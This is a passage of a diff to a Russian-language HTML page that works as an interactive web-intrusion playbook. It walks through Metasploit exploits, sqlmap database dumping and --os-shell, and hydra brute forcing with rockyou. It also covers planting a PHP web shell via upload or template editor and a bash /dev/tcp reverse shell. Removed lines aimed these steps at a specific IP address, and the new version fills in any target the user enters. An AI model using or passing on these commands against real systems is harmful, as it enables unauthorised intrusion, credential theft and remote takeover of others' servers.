 msf6&gt; set LPORT 4444
 msf6&gt; run</pre>
-<p><span class="flag">RHOSTS</span>=цель · <span class="flag">RPORT</span>=порт · <span class="flag">SSL</span>=https · <span class="flag">LHOST</span>=твой IP · <span class="flag">LPORT</span>=порт приёма шелла</p>
-<p>После <code>run</code> → meterpreter → <code>shell</code> → <code>whoami</code></p>
+<p><span class="flag">RHOSTS</span>=куда стреляем · <span class="flag">RPORT</span>=порт ·
+<span class="flag">SSL</span>=https · <span class="flag">LHOST</span>=твой IP · <span class="flag">LPORT</span>=порт приёма</p>
+<p>Появился <code>meterpreter &gt;</code> → <code>shell</code> → <code>whoami</code></p>
 </div>
 
-<button class="red" onclick="show('msf2')">[critical] [cve] Apache RCE</button>
-<div class="next msf" id="msf2">
-<h3>Metasploit · <span class="vuln">[Apache HTTP Server Path Traversal — CVE-2021-41773 / CVE-2021-42013]</span></h3>
+<button class="red" onclick="show('m2')">[critical] [cve] → SQL-инъекция</button>
+<div class="next msf" id="m2">
+<h3>Metasploit · <span class="vuln">[SQL Injection — название компонента/плагина из nuclei]</span></h3>
 <pre>msfconsole -q
-msf6&gt; search apache 41773
-msf6&gt; use exploit/multi/http/apache_normalize_path_rce
-msf6&gt; set RHOSTS 185.224.89.46
+msf6&gt; search &lt;название&gt; sqli
+msf6&gt; use auxiliary/scanner/http/&lt;модуль из поиска&gt;
+msf6&gt; set RHOSTS IP_ЦЕЛИ
+msf6&gt; set TARGETURI /путь/из/nuclei
+msf6&gt; run</pre>
+<p>Либо sqlmap — Шаг 8: <code>sqlmap -u "URL" --batch --dbs</code></p>
+</div>
+
+<button class="red" onclick="show('m3')">[high] [cve] → Path Traversal / LFI</button>
+<div class="next msf" id="m3">
+<h3>Metasploit · <span class="vuln">[LFI / Path Traversal]</span></h3>
+<pre>msfconsole -q
+msf6&gt; search &lt;cve-номер&gt;
+msf6&gt; use exploit/&lt;модуль&gt;
+msf6&gt; set RHOSTS IP_ЦЕЛИ
 msf6&gt; set TARGETURI /
 msf6&gt; set LHOST &lt;твой_IP&gt;
 msf6&gt; run</pre>
-<p>Версия 2.4.69 свежая — скорее всего не сработает, тогда дальше по схеме.</p>
+<p>Быстрая проверка руками: <code>?file=../../../../etc/passwd</code></p>
 </div>
 
-<button class="red" onclick="show('msf3')">[critical] [cve] Joomla Component SQLi</button>
-<div class="next msf" id="msf3">
-<h3>Metasploit · <span class="vuln">[Joomla Component SQL Injection — com_filman / com_fabrik и др.]</span></h3>
+<button class="red" onclick="show('m4')">[high] [misconfig] → открытая панель</button>
+<div class="next msf" id="m4">
+<h3>Metasploit · <span class="vuln">[Exposed Admin Panel / Default Login — misconfig]</span></h3>
 <pre>msfconsole -q
-msf6&gt; search joomla sqli
-msf6&gt; use auxiliary/scanner/http/joomla_*_sqli
-msf6&gt; set RHOSTS 185.224.89.46
-msf6&gt; run</pre>
-<p>Или через sqlmap — Шаг 8.</p>
-</div>
-
-<button class="red" onclick="show('msf4')">[high] [misconfig] админка / файлы открыты</button>
-<div class="next msf" id="msf4">
-<h3>Metasploit · <span class="vuln">[Joomla Directory Listing / Exposure — misconfig]</span></h3>
-<p>Открой URL в браузере. Для перебора админки:</p>
-<pre>msfconsole -q
-msf6&gt; use auxiliary/scanner/http/joomla_bruteforce_login
-msf6&gt; set RHOSTS 185.224.89.46
+msf6&gt; use auxiliary/scanner/http/&lt;brute-force модуль под CMS&gt;
+msf6&gt; set RHOSTS IP_ЦЕЛИ
 msf6&gt; set USERNAME admin
 msf6&gt; set PASS_FILE /usr/share/wordlists/rockyou.txt
-msf6&gt; set TARGETURI /administrator/index.php
+msf6&gt; set TARGETURI /путь/к/логину
 msf6&gt; run</pre>
-<p><span class="flag">USERNAME</span>=логин · <span class="flag">PASS_FILE</span>=словарь · <span class="flag">TARGETURI</span>=путь формы логина</p>
+<p><span class="flag">USERNAME</span>=логин · <span class="flag">PASS_FILE</span>=словарь · <span class="flag">TARGETURI</span>=путь формы</p>
 </div>
 
-<button onclick="show('n7none')">Пусто (No results found)</button>
-<div class="next" id="n7none">→ пусто ≠ сайт чист. Идём в Шаг 8.</div>
+<button onclick="show('m5')">Пусто (No results found)</button>
+<div class="next" id="m5">→ пусто ≠ сайт чист, просто эта категория чиста → Шаг 8</div>
 <br><button class="go" onclick="go('step8')">Шаг 8 →</button>
 </div>
 <div class="arrow">▼</div>
@@ -316,63 +479,134 @@ msf6&gt; run</pre>
 <!-- ═══ ШАГ 8 ═══ -->
 <div class="step" id="step8">
 <h2><span class="badge">Шаг 8</span> SQL-инъекция (sqlmap)</h2>
-<pre>sqlmap -u "https://www.siteexample.com/index.php?option=com_XXX&amp;param=1" \
+<p class="why">Сайт берёт данные из базы. Если параметр адреса подставляется в запрос без проверки — можно вытащить всю базу.</p>
+<pre>sqlmap -u "https://TARGET/page.php?id=1" \
   --batch --level 3 --risk 1 --dbs</pre>
+
+<details class="explain">
+<summary>Что это значит (объяснение)</summary>
+<div class="body">
+<ul>
+<li>Нужен адрес <b>с параметром</b> (<code>?id=1</code>, <code>?page=2</code>) — это и есть «входная точка»</li>
+<li><span class="k">--batch</span> — не задавать вопросы, отвечать по умолчанию</li>
+<li><span class="k">--level</span> — сколько техник пробовать: <b>1</b>=минимум, <b>3</b>=норма, <b>5</b>=максимум (долго)</li>
+<li><span class="k">--risk</span> — насколько рискованно: <b>1</b>=безопасно, <b>2</b>=средне, <b>3</b>=может изменить данные</li>
+<li><span class="k">--dbs</span> — показать список баз данных</li>
+</ul>
+<p><b>Что смотреть:</b> <span class="v">is injectable</span> = инъекция есть.</p>
+</div>
+</details>
+
 <div class="branch">Развилки:</div>
-<button class="red" onclick="show('n8a')">is injectable</button>
-<div class="next msf" id="n8a">
+<button onclick="show('m6')">is injectable</button>
+<div class="next msf" id="m6">
 <h3><span class="vuln">[SQL Injection — подтверждена]</span></h3>
-<pre>sqlmap -u "…" --batch -D &lt;база&gt; -T users --dump
-sqlmap -u "…" --batch --os-shell</pre>
-<p>После <code>os-shell&gt;</code>:</p>
-<pre>nc -lvnp 4444                                        ← у себя
+<pre>sqlmap -u "URL" --batch -D &lt;база&gt; -T users --dump
+sqlmap -u "URL" --batch --os-shell</pre>
+<p>После <code>os-shell&gt;</code> — обратный шелл:</p>
+<pre>nc -lvnp 4444                                    ← у себя
 os-shell&gt; bash -c "bash -i &gt;&amp; /dev/tcp/&lt;твой_IP&gt;/4444 0&gt;&amp;1"</pre>
 </div>
-<button onclick="show('n8b')">not injectable</button>
-<div class="next" id="n8b">→ Шаг 9</div>
+<button onclick="show('m7')">not injectable — форма POST</button>
+<div class="next" id="m7">
+<pre># сохрани запрос из Burp в req.txt:
+sqlmap -r req.txt --batch --level 3 --risk 1 --dbs</pre>
+→ тоже пусто → Шаг 9
+</div>
 <br><button class="go" onclick="go('step9')">Шаг 9 →</button>
 </div>
 <div class="arrow">▼</div>
 
 <!-- ═══ ШАГ 9 ═══ -->
 <div class="step" id="step9">
-<h2><span class="badge">Шаг 9</span> Вход в админку Joomla</h2>
-<pre>hydra -l admin -P /usr/share/wordlists/rockyou.txt www.siteexample.com \
-  http-post-form \
-  "/administrator/index.php:username=^USER^&amp;passwd=^PASS^&amp;option=com_login&amp;task=login:F=Username and password do not match" \
-  -t 4</pre>
-<p><span class="flag">-l</span>=логин · <span class="flag">-P</span>=словарь · <span class="flag">F=</span>=текст при неудаче (F12 в браузере) · <span class="flag">-t 4</span>=потоки</p>
+<h2><span class="badge">Шаг 9</span> Вход в панель (hydra)</h2>
+<p class="why">Форма входа найдена — часто пароль стандартный или из словаря.</p>
+<pre>hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET \
+  http-post-form "/login.php:user=^USER^&amp;pass=^PASS^:F=Invalid" -t 4</pre>
+
+<details class="explain">
+<summary>Что это значит (объяснение)</summary>
+<div class="body">
+<p>Сначала <b>руками</b>: <code>admin:admin</code>, <code>admin:password</code>, <code>admin:123456</code>.
+Потом в браузере (F12 → Network) смотрим имена полей и текст ошибки при неудаче.</p>
+<ul>
+<li><span class="k">-l</span> — один логин (маленькая L); <span class="k">-L</span> — файл со списком логинов</li>
+<li><span class="k">-P</span> — словарь паролей (большая P; маленькая <span class="k">-p</span> = один пароль)</li>
+<li><span class="k">http-post-form</span> — тип атаки «заполняем веб-форму»</li>
+<li>строка в кавычках = путь : поля : <span class="k">F=</span> текст при <b>неудачном</b> входе</li>
+<li><span class="k">-t</span> — сколько попыток одновременно (<b>4</b>=вежливо, <b>64</b>=громко)</li>
+</ul>
+</div>
+</details>
+
 <div class="branch">Развилки:</div>
-<button class="red" onclick="show('n9a')">password: xxx</button>
-<div class="next" id="n9a">→ зайди в /administrator/ → Template editor → вставь <code>&lt;?php system($_GET['cmd']); ?&gt;</code> в шаблон → RCE. Или шелл в <b>/files/</b>.</div>
-<button onclick="show('n9b')">0 valid password found</button>
-<div class="next" id="n9b">→ другие логины: admin2016, webmaster, admin → или Шаг 10</div>
+<button onclick="show('m8')">password: xxx</button>
+<div class="next" id="m8">→ зашёл в панель. Есть загрузка файла → залей <code>&lt;?php system($_GET['cmd']); ?&gt;</code> и открой <code>?cmd=whoami</code>. Есть редактор шаблона → вставь туда же.</div>
+<button onclick="show('m9')">0 valid password found</button>
+<div class="next" id="m9">→ другие логины (administrator, root, admin1) или Шаг 10</div>
 <br><button class="go" onclick="go('step10')">Шаг 10 →</button>
 </div>
 <div class="arrow">▼</div>
 
 <!-- ═══ ШАГ 10 ═══ -->
 <div class="step" id="step10">
-<h2><span class="badge">Шаг 10</span> Всё дало 0? — Burp вручную</h2>
-<pre>burpsuite   # прокси 127.0.0.1:8080</pre>
-<p>Ищи: скрытые параметры (?debug=1), IDOR (user_id=5→1), JWT в cookie.</p>
+<h2><span class="badge">Шаг 10</span> Всё дало 0 — руками (Burp)</h2>
+<p class="why">Инструменты ищут только известные шаблоны. Логические ошибки находит человек.</p>
+<pre>burpsuite    # в браузере прокси 127.0.0.1:8080</pre>
+
+<details class="explain">
+<summary>Что это значит (объяснение)</summary>
+<div class="body">
+<p><b>Burp Suite</b> — «перехватчик»: показывает каждый запрос, который браузер отправляет, и даёт его править перед отправкой.</p>
+<p><b>Что искать:</b></p>
+<ul>
+<li>скрытые параметры: <code>?debug=1</code>, <code>?admin=true</code></li>
+<li>подмена чужих данных (IDOR): <code>user_id=5</code> → <code>1</code></li>
+<li>JWT в cookie, подмена цены в корзине</li>
+<li>отсутствие проверки на сервере (проверка только в браузере)</li>
+</ul>
+</div>
+</details>
 </div>
 
-<!-- ══════ ПАНЕЛЬ ЗАМЕТОК ══════ -->
-<button id="notesToggle" onclick="toggleNotes()">📝 Заметки</button>
+<!-- ═══ ШАГ 8а ═══ -->
+<div class="step" id="step8a">
+<h2><span class="badge">Шаг 8а</span> Доступ получен — обратный шелл</h2>
+<p class="why">Сервер сам подключается к твоей машине, и ты получаешь командную строку на нём.</p>
+<pre>nc -lvnp 4444                           ← слушать у себя
 
+# на сервере:
+bash -i >&amp; /dev/tcp/ТВОЙ_IP/4444 0>&amp;1
+
+# появилось www-data@…$ → получилось:
+whoami
+id
+sudo -l                                  ← что можно от root</pre>
+
+<details class="explain">
+<summary>Что это значит (объяснение)</summary>
+<div class="body">
+<p><b>nc</b> (netcat) — «телефон»: ждёт входящее соединение на порту.
+<span class="k">-l</span>=слушать, <span class="k">-v</span>=подробно, <span class="k">-n</span>=без DNS, <span class="k">-p</span>=номер порта.</p>
+<p>Затем на сервере запускается команда, которая «звонит» тебе через <code>/dev/tcp</code> — так bash умеет делать TCP-соединение без сторонних программ.</p>
+<p>Когда видишь приглашение <span class="v">www-data@server:~$</span> — ты внутри. Дальше <code>sudo -l</code> показывает, какие команды можно запускать от root.</p>
+</div>
+</details>
+</div>
+
+<!-- ══════ ЗАМЕТКИ ══════ -->
+<button id="notesToggle" onclick="toggleNotes()">📝 Заметки</button>
 <aside id="notes">
   <header>
     <h2>Заметки</h2>
     <button onclick="toggleNotes()" title="Свернуть">✕</button>
   </header>
-  <textarea id="notesArea" placeholder="Пиши сюда находки, IP, пароли, вывод команд, идеи для отчёта…
+  <textarea id="notesArea" placeholder="Находки, вывод команд, пароли, TODO…
 
-Пример:
-— nmap: 80,443 открыты
-— /administrator/ → hydra: 0 паролей
-— nuclei: ничего
-— TODO: прогнать sqlmap по com_XXX"></textarea>
+— nmap: …
+— whatweb: …
+— nuclei: …
+— TODO: …"></textarea>
   <footer>
     <button onclick="copyNotes()">Копировать</button>
     <button onclick="downloadNotes()">Скачать .txt</button>
@@ -382,15 +616,41 @@ os-shell&gt; bash -c "bash -i &gt;&amp; /dev/tcp/&lt;твой_IP&gt;/4444 0&gt;&
 </aside>
 
 <script>
-/* ---------- Раскрывающиеся блоки ---------- */
+/* ══ Подстановка цели ══ */
+let TARGET = 'example.com';
+
+function applyTarget(){
+  let v = document.getElementById('targetInput').value.trim();
+  v = v.replace(/^https?:\/\//,'').replace(/\/$/,'');
+  if (!v) return;
+  TARGET = v;
+
+  document.querySelectorAll('pre, code').forEach(el => {
+    if (el.dataset.orig === undefined) el.dataset.orig = el.innerHTML;
+    let html = el.dataset.orig.split('TARGET').join(TARGET);
+    el.innerHTML = html;
+  });
+
+  const hint = document.getElementById('savedHint');
+  hint.textContent = '✓ цель: ' + TARGET;
+  hint.classList.add('show');
+  setTimeout(() => { hint.classList.remove('show'); hint.textContent = '✓ сохранено'; }, 1600);
+}
+
+document.getElementById('targetInput').addEventListener('keydown', e => {
+  if (e.key === 'Enter') applyTarget();
+});
+applyTarget();
+
+/* ══ Раскрывашки развилок ══ */
 function show(id){
   const el = document.getElementById(id);
   el.style.display = el.style.display === 'block' ? 'none' : 'block';
 }
 function go(id){ document.getElementById(id).scrollIntoView({behavior:'smooth'}); }
 
-/* ---------- Панель заметок ---------- */
-const KEY = 'siteexample_notes_v1';
+/* ══ Заметки ══ */
+const KEY = 'webcheck_notes_v1';
 const area = document.getElementById('notesArea');
 const hint = document.getElementById('savedHint');
 let saveTimer = null;
@@ -401,6 +661,7 @@ area.addEventListener('input', () => {
   clearTimeout(saveTimer);
   saveTimer = setTimeout(() => {
     localStorage.setItem(KEY, area.value);
+    hint.textContent = '✓ сохранено';
     hint.classList.add('show');
     setTimeout(() => hint.classList.remove('show'), 1200);
   }, 400);
@@ -423,16 +684,16 @@ function copyNotes(){
 }
 
 function downloadNotes(){
-  const blob = new Blob([area.value], {type: 'text/plain;charset=utf-8'});
+  const blob = new Blob([area.value], {type:'text/plain;charset=utf-8'});
   const a = document.createElement('a');
   a.href = URL.createObjectURL(blob);
-  a.download = 'siteexample_notes_' + new Date().toISOString().slice(0,10) + '.txt';
+  a.download = 'webcheck_notes_' + new Date().toISOString().slice(0,10) + '.txt';
   a.click();
   URL.revokeObjectURL(a.href);
 }
 
 function clearNotes(){
-  if (confirm('Удалить все заметки? Отменить будет нельзя.')) {
+  if (confirm('Удалить все заметки?')) {
     area.value = '';
     localStorage.removeItem(KEY);
   }
